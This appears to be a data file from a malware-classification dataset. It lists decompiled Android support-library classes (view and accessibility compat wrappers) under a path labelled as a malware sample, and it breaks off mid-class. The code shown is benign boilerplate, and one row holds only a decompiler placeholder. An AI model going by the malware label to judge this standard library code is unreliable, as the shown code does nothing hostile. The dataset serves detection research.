"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\VisibilityListener.code","public interface VisibilityListener {   void onActionProviderVisibilityChanged(  boolean z); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\WindowCompat.code","public class WindowCompat {   public static final int FEATURE_ACTION_BAR=8;   public static final int FEATURE_ACTION_BAR_OVERLAY=9;   public static final int FEATURE_ACTION_MODE_OVERLAY=10; } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view.accessibility\AccessibilityEventCompat.code","public class AccessibilityEventCompat {   private static final AccessibilityEventVersionImpl IMPL;   public static final int TYPES_ALL_MASK=-1;   public static final int TYPE_ANNOUNCEMENT=16384;   public static final int TYPE_GESTURE_DETECTION_END=524288;   public static final int TYPE_GESTURE_DETECTION_START=262144;   public static final int TYPE_TOUCH_EXPLORATION_GESTURE_END=1024;   public static final int TYPE_TOUCH_EXPLORATION_GESTURE_START=512;   public static final int TYPE_TOUCH_INTERACTION_END=2097152;   public static final int TYPE_TOUCH_INTERACTION_START=1048576;   public static final int TYPE_VIEW_ACCESSIBILITY_FOCUSED=32768;   public static final int TYPE_VIEW_ACCESSIBILITY_FOCUS_CLEARED=65536;   public static final int TYPE_VIEW_HOVER_ENTER=128;   public static final int TYPE_VIEW_HOVER_EXIT=256;   public static final int TYPE_VIEW_SCROLLED=4096;   public static final int TYPE_VIEW_TEXT_SELECTION_CHANGED=8192;   public static final int TYPE_VIEW_TEXT_TRAVERSED_AT_MOVEMENT_GRANULARITY=131072;   public static final int TYPE_WINDOW_CONTENT_CHANGED=2048; interface AccessibilityEventVersionImpl {     void appendRecord(    AccessibilityEvent accessibilityEvent,    Object obj);     Object getRecord(    AccessibilityEvent accessibilityEvent,    int i);     int getRecordCount(    AccessibilityEvent accessibilityEvent);   } static class AccessibilityEventStubImpl implements AccessibilityEventVersionImpl {     AccessibilityEventStubImpl(){     }     @Override public void appendRecord(    AccessibilityEvent event,    Object record){     }     @Override public Object getRecord(    AccessibilityEvent event,    int index){       return null;     }     @Override public int getRecordCount(    AccessibilityEvent event){       return 0;     }   } static class AccessibilityEventIcsImpl extends AccessibilityEventStubImpl {     AccessibilityEventIcsImpl(){     }     @Override public void appendRecord(    AccessibilityEvent event,    Object record){       AccessibilityEventCompatIcs.appendRecord(event,record);     }     @Override public Object getRecord(    AccessibilityEvent event,    int index){       return AccessibilityEventCompatIcs.getRecord(event,index);     }     @Override public int getRecordCount(    AccessibilityEvent event){       return AccessibilityEventCompatIcs.getRecordCount(event);     }   } static {     if (Build.VERSION.SDK_INT >= 14) {       IMPL=new AccessibilityEventIcsImpl();     }  else {       IMPL=new AccessibilityEventStubImpl();     }   }   private AccessibilityEventCompat(){   }   public static int getRecordCount(  AccessibilityEvent event){     return IMPL.getRecordCount(event);   }   public static void appendRecord(  AccessibilityEvent event,  AccessibilityRecordCompat record){     IMPL.appendRecord(event,record.getImpl());   }   public static AccessibilityRecordCompat getRecord(  AccessibilityEvent event,  int index){     return new AccessibilityRecordCompat(IMPL.getRecord(event,index));   }   public static AccessibilityRecordCompat asRecord(  AccessibilityEvent event){     return new AccessibilityRecordCompat(event);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view.accessibility\AccessibilityEventCompatIcs.code","class AccessibilityEventCompatIcs {   AccessibilityEventCompatIcs(){   }   public static int getRecordCount(  AccessibilityEvent event){     return event.getRecordCount();   }   public static void appendRecord(  AccessibilityEvent event,  Object record){     event.appendRecord((AccessibilityRecord)record);   }   public static Object getRecord(  AccessibilityEvent event,  int index){     return event.getRecord(index);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view.accessibility\AccessibilityEventIcsImpl.code","static class AccessibilityEventIcsImpl extends AccessibilityEventStubImpl {   AccessibilityEventIcsImpl(){   }   @Override public void appendRecord(  AccessibilityEvent event,  Object record){     AccessibilityEventCompatIcs.appendRecord(event,record);   }   @Override public Object getRecord(  AccessibilityEvent event,  int index){     return AccessibilityEventCompatIcs.getRecord(event,index);   }   @Override public int getRecordCount(  AccessibilityEvent event){     return AccessibilityEventCompatIcs.getRecordCount(event);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view.accessibility\AccessibilityEventStubImpl.code","static class AccessibilityEventStubImpl implements AccessibilityEventVersionImpl {   AccessibilityEventStubImpl(){   }   @Override public void appendRecord(  AccessibilityEvent event,  Object record){   }   @Override public Object getRecord(  AccessibilityEvent event,  int index){     return null;   }   @Override public int getRecordCount(  AccessibilityEvent event){     return 0;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view.accessibility\AccessibilityEventVersionImpl.code","interface AccessibilityEventVersionImpl {   void appendRecord(  AccessibilityEvent accessibilityEvent,  Object obj);   Object getRecord(  AccessibilityEvent accessibilityEvent,  int i);   int getRecordCount(  AccessibilityEvent accessibilityEvent); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view.accessibility\AccessibilityManagerCompat.code","public class AccessibilityManagerCompat {   private static final AccessibilityManagerVersionImpl IMPL; interface AccessibilityManagerVersionImpl {     boolean addAccessibilityStateChangeListener(    AccessibilityManager accessibilityManager,    AccessibilityStateChangeListenerCompat accessibilityStateChangeListenerCompat);     List<AccessibilityServiceInfo> getEnabledAccessibilityServiceList(    AccessibilityManager accessibilityManager,    int i);     List<AccessibilityServiceInfo> getInstalledAccessibilityServiceList(    AccessibilityManager accessibilityManager);     boolean isTouchExplorationEnabled(    AccessibilityManager accessibilityManager);     Object newAccessiblityStateChangeListener(    AccessibilityStateChangeListenerCompat accessibilityStateChangeListenerCompat);     boolean removeAccessibilityStateChangeListener(    AccessibilityManager accessibilityManager,    AccessibilityStateChangeListenerCompat accessibilityStateChangeListenerCompat);   } public static abstract class AccessibilityStateChangeListenerCompat {     final Object mListener=AccessibilityManagerCompat.IMPL.newAccessiblityStateChangeListener(this);     public abstract void onAccessibilityStateChanged(    boolean z);   } static class AccessibilityManagerStubImpl implements AccessibilityManagerVersionImpl {     AccessibilityManagerStubImpl(){     }     @Override public Object newAccessiblityStateChangeListener(    AccessibilityStateChangeListenerCompat listener){       return null;     }     @Override public boolean addAccessibilityStateChangeListener(    AccessibilityManager manager,    AccessibilityStateChangeListenerCompat listener){       return false;     }     @Override public boolean removeAccessibilityStateChangeListener(    AccessibilityManager manager,    AccessibilityStateChangeListenerCompat listener){       return false;     }     @Override public List<AccessibilityServiceInfo> getEnabledAccessibilityServiceList(    AccessibilityManager manager,    int feedbackTypeFlags){       return Collections.emptyList();     }     @Override public List<AccessibilityServiceInfo> getInstalledAccessibilityServiceList(    AccessibilityManager manager){       return Collections.emptyList();     }     @Override public boolean isTouchExplorationEnabled(    AccessibilityManager manager){       return false;     }   } static class AccessibilityManagerIcsImpl extends AccessibilityManagerStubImpl {     AccessibilityManagerIcsImpl(){     }     @Override public Object newAccessiblityStateChangeListener(    final AccessibilityStateChangeListenerCompat listener){       return AccessibilityManagerCompatIcs.newAccessibilityStateChangeListener(new AccessibilityManagerCompatIcs.AccessibilityStateChangeListenerBridge(){         @Override public void onAccessibilityStateChanged(        boolean enabled){           listener.onAccessibilityStateChanged(enabled);         }       } );     }     @Override public boolean addAccessibilityStateChangeListener(    AccessibilityManager manager,    AccessibilityStateChangeListenerCompat listener){       return AccessibilityManagerCompatIcs.addAccessibilityStateChangeListener(manager,listener.mListener);     }     @Override public boolean removeAccessibilityStateChangeListener(    AccessibilityManager manager,    AccessibilityStateChangeListenerCompat listener){       return AccessibilityManagerCompatIcs.removeAccessibilityStateChangeListener(manager,listener.mListener);     }     @Override public List<AccessibilityServiceInfo> getEnabledAccessibilityServiceList(    AccessibilityManager manager,    int feedbackTypeFlags){       return AccessibilityManagerCompatIcs.getEnabledAccessibilityServiceList(manager,feedbackTypeFlags);     }     @Override public List<AccessibilityServiceInfo> getInstalledAccessibilityServiceList(    AccessibilityManager manager){       return AccessibilityManagerCompatIcs.getInstalledAccessibilityServiceList(manager);     }     @Override public boolean isTouchExplorationEnabled(    AccessibilityManager manager){       return AccessibilityManagerCompatIcs.isTouchExplorationEnabled(manager);     }   } static {     if (Build.VERSION.SDK_INT >= 14) {       IMPL=new AccessibilityManagerIcsImpl();     }  else {       IMPL=new AccessibilityManagerStubImpl();     }   }   public static boolean addAccessibilityStateChangeListener(  AccessibilityManager manager,  AccessibilityStateChangeListenerCompat listener){     return IMPL.addAccessibilityStateChangeListener(manager,listener);   }   public static boolean removeAccessibilityStateChangeListener(  AccessibilityManager manager,  AccessibilityStateChangeListenerCompat listener){     return IMPL.removeAccessibilityStateChangeListener(manager,listener);   }   public static List<AccessibilityServiceInfo> getInstalledAccessibilityServiceList(  AccessibilityManager manager){     return IMPL.getInstalledAccessibilityServiceList(manager);   }   public static List<AccessibilityServiceInfo> getEnabledAccessibilityServiceList(  AccessibilityManager manager,  int feedbackTypeFlags){     return IMPL.getEnabledAccessibilityServiceList(manager,feedbackTypeFlags);   }   public static boolean isTouchExplorationEnabled(  AccessibilityManager manager){     return IMPL.isTouchExplorationEnabled(manager);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view.accessibility\AccessibilityManagerCompatIcs.code","class AccessibilityManagerCompatIcs { interface AccessibilityStateChangeListenerBridge {     void onAccessibilityStateChanged(    boolean z);   }   AccessibilityManagerCompatIcs(){   }   public static Object newAccessibilityStateChangeListener(  final AccessibilityStateChangeListenerBridge bridge){     return new AccessibilityManager.AccessibilityStateChangeListener(){       @Override public void onAccessibilityStateChanged(      boolean enabled){         AccessibilityStateChangeListenerBridge.this.onAccessibilityStateChanged(enabled);       }     } ;   }   public static boolean addAccessibilityStateChangeListener(  AccessibilityManager manager,  Object listener){     return manager.addAccessibilityStateChangeListener((AccessibilityManager.AccessibilityStateChangeListener)listener);   }   public static boolean removeAccessibilityStateChangeListener(  AccessibilityManager manager,  Object listener){     return manager.removeAccessibilityStateChangeListener((AccessibilityManager.AccessibilityStateChangeListener)listener);   }   public static List<AccessibilityServiceInfo> getEnabledAccessibilityServiceList(  AccessibilityManager manager,  int feedbackTypeFlags){     return manager.getEnabledAccessibilityServiceList(feedbackTypeFlags);   }   public static List<AccessibilityServiceInfo> getInstalledAccessibilityServiceList(  AccessibilityManager manager){     return manager.getInstalledAccessibilityServiceList();   }   public static boolean isTouchExplorationEnabled(  AccessibilityManager manager){     return manager.isTouchExplorationEnabled();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view.accessibility\AccessibilityManagerIcsImpl.code","static class AccessibilityManagerIcsImpl extends AccessibilityManagerStubImpl {   AccessibilityManagerIcsImpl(){   }   @Override public Object newAccessiblityStateChangeListener(  final AccessibilityStateChangeListenerCompat listener){     return AccessibilityManagerCompatIcs.newAccessibilityStateChangeListener(new AccessibilityManagerCompatIcs.AccessibilityStateChangeListenerBridge(){       @Override public void onAccessibilityStateChanged(      boolean enabled){         listener.onAccessibilityStateChanged(enabled);       }     } );   }   @Override public boolean addAccessibilityStateChangeListener(  AccessibilityManager manager,  AccessibilityStateChangeListenerCompat listener){     return AccessibilityManagerCompatIcs.addAccessibilityStateChangeListener(manager,listener.mListener);   }   @Override public boolean removeAccessibilityStateChangeListener(  AccessibilityManager manager,  AccessibilityStateChangeListenerCompat listener){     return AccessibilityManagerCompatIcs.removeAccessibilityStateChangeListener(manager,listener.mListener);   }   @Override public List<AccessibilityServiceInfo> getEnabledAccessibilityServiceList(  AccessibilityManager manager,  int feedbackTypeFlags){     return AccessibilityManagerCompatIcs.getEnabledAccessibilityServiceList(manager,feedbackTypeFlags);   }   @Override public List<AccessibilityServiceInfo> getInstalledAccessibilityServiceList(  AccessibilityManager manager){     return AccessibilityManagerCompatIcs.getInstalledAccessibilityServiceList(manager);   }   @Override public boolean isTouchExplorationEnabled(  AccessibilityManager manager){     return AccessibilityManagerCompatIcs.isTouchExplorationEnabled(manager);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view.accessibility\AccessibilityManagerStubImpl.code","static class AccessibilityManagerStubImpl implements AccessibilityManagerVersionImpl {   AccessibilityManagerStubImpl(){   }   @Override public Object newAccessiblityStateChangeListener(  AccessibilityStateChangeListenerCompat listener){     return null;   }   @Override public boolean addAccessibilityStateChangeListener(  AccessibilityManager manager,  AccessibilityStateChangeListenerCompat listener){     return false;   }   @Override public boolean removeAccessibilityStateChangeListener(  AccessibilityManager manager,  AccessibilityStateChangeListenerCompat listener){     return false;   }   @Override public List<AccessibilityServiceInfo> getEnabledAccessibilityServiceList(  AccessibilityManager manager,  int feedbackTypeFlags){     return Collections.emptyList();   }   @Override public List<AccessibilityServiceInfo> getInstalledAccessibilityServiceList(  AccessibilityManager manager){     return Collections.emptyList();   }   @Override public boolean isTouchExplorationEnabled(  AccessibilityManager manager){     return false;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view.accessibility\AccessibilityManagerVersionImpl.code","interface AccessibilityManagerVersionImpl {   boolean addAccessibilityStateChangeListener(  AccessibilityManager accessibilityManager,  AccessibilityStateChangeListenerCompat accessibilityStateChangeListenerCompat);   List<AccessibilityServiceInfo> getEnabledAccessibilityServiceList(  AccessibilityManager accessibilityManager,  int i);   List<AccessibilityServiceInfo> getInstalledAccessibilityServiceList(  AccessibilityManager accessibilityManager);   boolean isTouchExplorationEnabled(  AccessibilityManager accessibilityManager);   Object newAccessiblityStateChangeListener(  AccessibilityStateChangeListenerCompat accessibilityStateChangeListenerCompat);   boolean removeAccessibilityStateChangeListener(  AccessibilityManager accessibilityManager,  AccessibilityStateChangeListenerCompat accessibilityStateChangeListenerCompat); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view.accessibility\AccessibilityNodeInfoBridge.code","interface AccessibilityNodeInfoBridge {   Object createAccessibilityNodeInfo(  int i);   List<Object> findAccessibilityNodeInfosByText(  String str,  int i);   boolean performAction(  int i,  int i2,  Bundle bundle); } interface AccessibilityNodeInfoBridge {   Object createAccessibilityNodeInfo(  int i);   List<Object> findAccessibilityNodeInfosByText(  String str,  int i);   Object findFocus(  int i);   boolean performAction(  int i,  int i2,  Bundle bundle); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view.accessibility\AccessibilityNodeInfoCompat.code","!org.eclipse.jdt.core.dom.TypeDeclaration@f23948b"
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view.accessibility\AccessibilityNodeInfoCompatIcs.code","class AccessibilityNodeInfoCompatIcs {   AccessibilityNodeInfoCompatIcs(){   }   public static Object obtain(){     return AccessibilityNodeInfo.obtain();   }   public static Object obtain(  View source){     return AccessibilityNodeInfo.obtain(source);   }   public static Object obtain(  Object info){     return AccessibilityNodeInfo.obtain((AccessibilityNodeInfo)info);   }   public static void addAction(  Object info,  int action){     ((AccessibilityNodeInfo)info).addAction(action);   }   public static void addChild(  Object info,  View child){     ((AccessibilityNodeInfo)info).addChild(child);   }   public static List<Object> findAccessibilityNodeInfosByText(  Object info,  String text){     List result=((AccessibilityNodeInfo)info).findAccessibilityNodeInfosByText(text);     return result;   }   public static int getActions(  Object info){     return ((AccessibilityNodeInfo)info).getActions();   }   public static void getBoundsInParent(  Object info,  Rect outBounds){     ((AccessibilityNodeInfo)info).getBoundsInParent(outBounds);   }   public static void getBoundsInScreen(  Object info,  Rect outBounds){     ((AccessibilityNodeInfo)info).getBoundsInScreen(outBounds);   }   public static Object getChild(  Object info,  int index){     return ((AccessibilityNodeInfo)info).getChild(index);   }   public static int getChildCount(  Object info){     return ((AccessibilityNodeInfo)info).getChildCount();   }   public static CharSequence getClassName(  Object info){     return ((AccessibilityNodeInfo)info).getClassName();   }   public static CharSequence getContentDescription(  Object info){     return ((AccessibilityNodeInfo)info).getContentDescription();   }   public static CharSequence getPackageName(  Object info){     return ((AccessibilityNodeInfo)info).getPackageName();   }   public static Object getParent(  Object info){     return ((AccessibilityNodeInfo)info).getParent();   }   public static CharSequence getText(  Object info){     return ((AccessibilityNodeInfo)info).getText();   }   public static int getWindowId(  Object info){     return ((AccessibilityNodeInfo)info).getWindowId();   }   public static boolean isCheckable(  Object info){     return ((AccessibilityNodeInfo)info).isCheckable();   }   public static boolean isChecked(  Object info){     return ((AccessibilityNodeInfo)info).isChecked();   }   public static boolean isClickable(  Object info){     return ((AccessibilityNodeInfo)info).isClickable();   }   public static boolean isEnabled(  Object info){     return ((AccessibilityNodeInfo)info).isEnabled();   }   public static boolean isFocusable(  Object info){     return ((AccessibilityNodeInfo)info).isFocusable();   }   public static boolean isFocused(  Object info){     return ((AccessibilityNodeInfo)info).isFocused();   }   public static boolean isLongClickable(  Object info){     return ((AccessibilityNodeInfo)info).isLongClickable();   }   public static boolean isPassword(  Object info){     return ((AccessibilityNodeInfo)info).isPassword();   }   public static boolean isScrollable(  Object info){     return ((AccessibilityNodeInfo)info).isScrollable();   }   public static boolean isSelected(  Object info){     return ((AccessibilityNodeInfo)info).isSelected();   }   public static boolean performAction(  Object info,  int action){     return ((AccessibilityNodeInfo)info).performAction(action);   }   public static void setBoundsInParent(  Object info,  Rect bounds){     ((AccessibilityNodeInfo)info).setBoundsInParent(bounds);   }   public static void setBoundsInScreen(  Object info,  Rect bounds){     ((AccessibilityNodeInfo)info).setBoundsInScreen(bounds);   }   public static void setCheckable(  Object info,  boolean checkable){     ((AccessibilityNodeInfo)info).setCheckable(checkable);   }   public static void setChecked(  Object info,  boolean checked){     ((AccessibilityNodeInfo)info).setChecked(checked);   }   public static void setClassName(  Object info,  CharSequence className){     ((AccessibilityNodeInfo)info).setClassName(className);   }   public static void setClickable(  Object info,  boolean clickable){     ((AccessibilityNodeInfo)info).setClickable(clickable);   }   public static void setContentDescription(  Object info,  CharSequence contentDescription){     ((AccessibilityNodeInfo)info).setContentDescription(contentDescription);   }   public static void setEnabled(  Object info,  boolean enabled){     ((AccessibilityNodeInfo)info).setEnabled(enabled);   }   public static void setFocusable(  Object info,  boolean focusable){     ((AccessibilityNodeInfo)info).setFocusable(focusable);   }   public static void setFocused(  Object info,  boolean focused){     ((AccessibilityNodeInfo)info).setFocused(focused);   }   public static void setLongClickable(  Object info,  boolean longClickable){     ((AccessibilityNodeInfo)info).setLongClickable(longClickable);   }   public static void setPackageName(  Object info,  CharSequence packageName){     ((AccessibilityNodeInfo)info).setPackageName(packageName);   }   public static void setParent(  Object info,  View parent){     ((AccessibilityNodeInfo)info).setParent(parent);   }   public static void setPassword(  Object info,  boolean password){     ((AccessibilityNodeInfo)info).setPassword(password);   }   public static void setScrollable(  Object info,  boolean scrollable){     ((AccessibilityNodeInfo)info).setScrollable(scrollable);   }   public static void setSelected(  Object info,  boolean selected){     ((AccessibilityNodeInfo)info).setSelected(selected);   }   public static void setSource(  Object info,  View source){     ((AccessibilityNodeInfo)info).setSource(source);   }   public static void setText(  Object info,  CharSequence text){     ((AccessibilityNodeInfo)info).setText(text);   }   public static void recycle(  Object info){     ((AccessibilityNodeInfo)info).recycle();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view.accessibility\AccessibilityNodeInfoCompatJellyBean.code","class AccessibilityNodeInfoCompatJellyBean {   AccessibilityNodeInfoCompatJellyBean(){   }   public static void addChild(  Object info,  View child,  int virtualDescendantId){     ((AccessibilityNodeInfo)info).addChild(child,virtualDescendantId);   }   public static void setSource(  Object info,  View root,  int virtualDescendantId){     ((AccessibilityNodeInfo)info).setSource(root,virtualDescendantId);   }   public static boolean isVisibleToUser(  Object info){     return ((AccessibilityNodeInfo)info).isVisibleToUser();   }   public static void setVisibleToUser(  Object info,  boolean visibleToUser){     ((AccessibilityNodeInfo)info).setVisibleToUser(visibleToUser);   }   public static boolean performAction(  Object info,  int action,  Bundle arguments){     return ((AccessibilityNodeInfo)info).performAction(action,arguments);   }   public static void setMovementGranularities(  Object info,  int granularities){     ((AccessibilityNodeInfo)info).setMovementGranularities(granularities);   }   public static int getMovementGranularities(  Object info){     return ((AccessibilityNodeInfo)info).getMovementGranularities();   }   public static Object obtain(  View root,  int virtualDescendantId){     return AccessibilityNodeInfo.obtain(root,virtualDescendantId);   }   public static Object findFocus(  Object info,  int focus){     return ((AccessibilityNodeInfo)info).findFocus(focus);   }   public static Object focusSearch(  Object info,  int direction){     return ((AccessibilityNodeInfo)info).focusSearch(direction);   }   public static void setParent(  Object info,  View root,  int virtualDescendantId){     ((AccessibilityNodeInfo)info).setParent(root,virtualDescendantId);   }   public static boolean isAccessibilityFocused(  Object info){     return ((AccessibilityNodeInfo)info).isAccessibilityFocused();   }   public static void setAccesibilityFocused(  Object info,  boolean focused){     ((AccessibilityNodeInfo)info).setAccessibilityFocused(focused);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view.accessibility\AccessibilityNodeInfoCompatJellybeanMr2.code","class AccessibilityNodeInfoCompatJellybeanMr2 {   AccessibilityNodeInfoCompatJellybeanMr2(){   }   public static void setViewIdResourceName(  Object info,  String viewId){     ((AccessibilityNodeInfo)info).setViewIdResourceName(viewId);   }   public static String getViewIdResourceName(  Object info){     return ((AccessibilityNodeInfo)info).getViewIdResourceName();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view.accessibility\AccessibilityNodeInfoCompatKitKat.code","class AccessibilityNodeInfoCompatKitKat {   AccessibilityNodeInfoCompatKitKat(){   }   public static int getLiveRegion(  Object info){     return ((AccessibilityNodeInfo)info).getLiveRegion();   }   public static void setLiveRegion(  Object info,  int mode){     ((AccessibilityNodeInfo)info).setLiveRegion(mode);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view.accessibility\AccessibilityNodeInfoIcsImpl.code","static class AccessibilityNodeInfoIcsImpl extends AccessibilityNodeInfoStubImpl {   AccessibilityNodeInfoIcsImpl(){   }   @Override public Object obtain(){     return AccessibilityNodeInfoCompatIcs.obtain();   }   @Override public Object obtain(  View source){     return AccessibilityNodeInfoCompatIcs.obtain(source);   }   @Override public Object obtain(  Object info){     return AccessibilityNodeInfoCompatIcs.obtain(info);   }   @Override public void addAction(  Object info,  int action){     AccessibilityNodeInfoCompatIcs.addAction(info,action);   }   @Override public void addChild(  Object info,  View child){     AccessibilityNodeInfoCompatIcs.addChild(info,child);   }   @Override public List<Object> findAccessibilityNodeInfosByText(  Object info,  String text){     return AccessibilityNodeInfoCompatIcs.findAccessibilityNodeInfosByText(info,text);   }   @Override public int getActions(  Object info){     return AccessibilityNodeInfoCompatIcs.getActions(info);   }   @Override public void getBoundsInParent(  Object info,  Rect outBounds){     AccessibilityNodeInfoCompatIcs.getBoundsInParent(info,outBounds);   }   @Override public void getBoundsInScreen(  Object info,  Rect outBounds){     AccessibilityNodeInfoCompatIcs.getBoundsInScreen(info,outBounds);   }   @Override public Object getChild(  Object info,  int index){     return AccessibilityNodeInfoCompatIcs.getChild(info,index);   }   @Override public int getChildCount(  Object info){     return AccessibilityNodeInfoCompatIcs.getChildCount(info);   }   @Override public CharSequence getClassName(  Object info){     return AccessibilityNodeInfoCompatIcs.getClassName(info);   }   @Override public CharSequence getContentDescription(  Object info){     return AccessibilityNodeInfoCompatIcs.getContentDescription(info);   }   @Override public CharSequence getPackageName(  Object info){     return AccessibilityNodeInfoCompatIcs.getPackageName(info);   }   @Override public Object getParent(  Object info){     return AccessibilityNodeInfoCompatIcs.getParent(info);   }   @Override public CharSequence getText(  Object info){     return AccessibilityNodeInfoCompatIcs.getText(info);   }   @Override public int getWindowId(  Object info){     return AccessibilityNodeInfoCompatIcs.getWindowId(info);   }   @Override public boolean isCheckable(  Object info){     return AccessibilityNodeInfoCompatIcs.isCheckable(info);   }   @Override public boolean isChecked(  Object info){     return AccessibilityNodeInfoCompatIcs.isChecked(info);   }   @Override public boolean isClickable(  Object info){     return AccessibilityNodeInfoCompatIcs.isClickable(info);   }   @Override public boolean isEnabled(  Object info){     return AccessibilityNodeInfoCompatIcs.isEnabled(info);   }   @Override public boolean isFocusable(  Object info){     return AccessibilityNodeInfoCompatIcs.isFocusable(info);   }   @Override public boolean isFocused(  Object info){     return AccessibilityNodeInfoCompatIcs.isFocused(info);   }   @Override public boolean isLongClickable(  Object info){     return AccessibilityNodeInfoCompatIcs.isLongClickable(info);   }   @Override public boolean isPassword(  Object info){     return AccessibilityNodeInfoCompatIcs.isPassword(info);   }   @Override public boolean isScrollable(  Object info){     return AccessibilityNodeInfoCompatIcs.isScrollable(info);   }   @Override public boolean isSelected(  Object info){     return AccessibilityNodeInfoCompatIcs.isSelected(info);   }   @Override public boolean performAction(  Object info,  int action){     return AccessibilityNodeInfoCompatIcs.performAction(info,action);   }   @Override public void setBoundsInParent(  Object info,  Rect bounds){     AccessibilityNodeInfoCompatIcs.setBoundsInParent(info,bounds);   }   @Override public void setBoundsInScreen(  Object info,  Rect bounds){     AccessibilityNodeInfoCompatIcs.setBoundsInScreen(info,bounds);   }   @Override public void setCheckable(  Object info,  boolean checkable){     AccessibilityNodeInfoCompatIcs.setCheckable(info,checkable);   }   @Override public void setChecked(  Object info,  boolean checked){     AccessibilityNodeInfoCompatIcs.setChecked(info,checked);   }   @Override public void setClassName(  Object info,  CharSequence className){     AccessibilityNodeInfoCompatIcs.setClassName(info,className);   }   @Override public void setClickable(  Object info,  boolean clickable){     AccessibilityNodeInfoCompatIcs.setClickable(info,clickable);   }   @Override public void setContentDescription(  Object info,  CharSequence contentDescription){     AccessibilityNodeInfoCompatIcs.setContentDescription(info,contentDescription);   }   @Override public void setEnabled(  Object info,  boolean enabled){     AccessibilityNodeInfoCompatIcs.setEnabled(info,enabled);   }   @Override public void setFocusable(  Object info,  boolean focusable){     AccessibilityNodeInfoCompatIcs.setFocusable(info,focusable);   }   @Override public void setFocused(  Object info,  boolean focused){     AccessibilityNodeInfoCompatIcs.setFocused(info,focused);   }   @Override public void setLongClickable(  Object info,  boolean longClickable){     AccessibilityNodeInfoCompatIcs.setLongClickable(info,longClickable);   }   @Override public void setPackageName(  Object info,  CharSequence packageName){     AccessibilityNodeInfoCompatIcs.setPackageName(info,packageName);   }   @Override public void setParent(  Object info,  View parent){     AccessibilityNodeInfoCompatIcs.setParent(info,parent);   }   @Override public void setPassword(  Object info,  boolean password){     AccessibilityNodeInfoCompatIcs.setPassword(info,password);   }   @Override public void setScrollable(  Object info,  boolean scrollable){     AccessibilityNodeInfoCompatIcs.setScrollable(info,scrollable);   }   @Override public void setSelected(  Object info,  boolean selected){     AccessibilityNodeInfoCompatIcs.setSelected(info,selected);   }   @Override public void setSource(  Object info,  View source){     AccessibilityNodeInfoCompatIcs.setSource(info,source);   }   @Override public void setText(  Object info,  CharSequence text){     AccessibilityNodeInfoCompatIcs.setText(info,text);   }   @Override public void recycle(  Object info){     AccessibilityNodeInfoCompatIcs.recycle(info);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view.accessibility\AccessibilityNodeInfoImpl.code","public interface AccessibilityNodeInfoImpl {   void addAction(  Object obj,  int i);   void addChild(  Object obj,  View view);   void addChild(  Object obj,  View view,  int i);   List<Object> findAccessibilityNodeInfosByText(  Object obj,  String str);   Object findFocus(  Object obj,  int i);   Object focusSearch(  Object obj,  int i);   int getActions(  Object obj);   void getBoundsInParent(  Object obj,  Rect rect);   void getBoundsInScreen(  Object obj,  Rect rect);   Object getChild(  Object obj,  int i);   int getChildCount(  Object obj);   CharSequence getClassName(  Object obj);   CharSequence getContentDescription(  Object obj);   int getLiveRegion(  Object obj);   int getMovementGranularities(  Object obj);   CharSequence getPackageName(  Object obj);   Object getParent(  Object obj);   CharSequence getText(  Object obj);   String getViewIdResourceName(  Object obj);   int getWindowId(  Object obj);   boolean isAccessibilityFocused(  Object obj);   boolean isCheckable(  Object obj);   boolean isChecked(  Object obj);   boolean isClickable(  Object obj);   boolean isEnabled(  Object obj);   boolean isFocusable(  Object obj);   boolean isFocused(  Object obj);   boolean isLongClickable(  Object obj);   boolean isPassword(  Object obj);   boolean isScrollable(  Object obj);   boolean isSelected(  Object obj);   boolean isVisibleToUser(  Object obj);   Object obtain();   Object obtain(  View view);   Object obtain(  View view,  int i);   Object obtain(  Object obj);   boolean performAction(  Object obj,  int i);   boolean performAction(  Object obj,  int i,  Bundle bundle);   void recycle(  Object obj);   void setAccessibilityFocused(  Object obj,  boolean 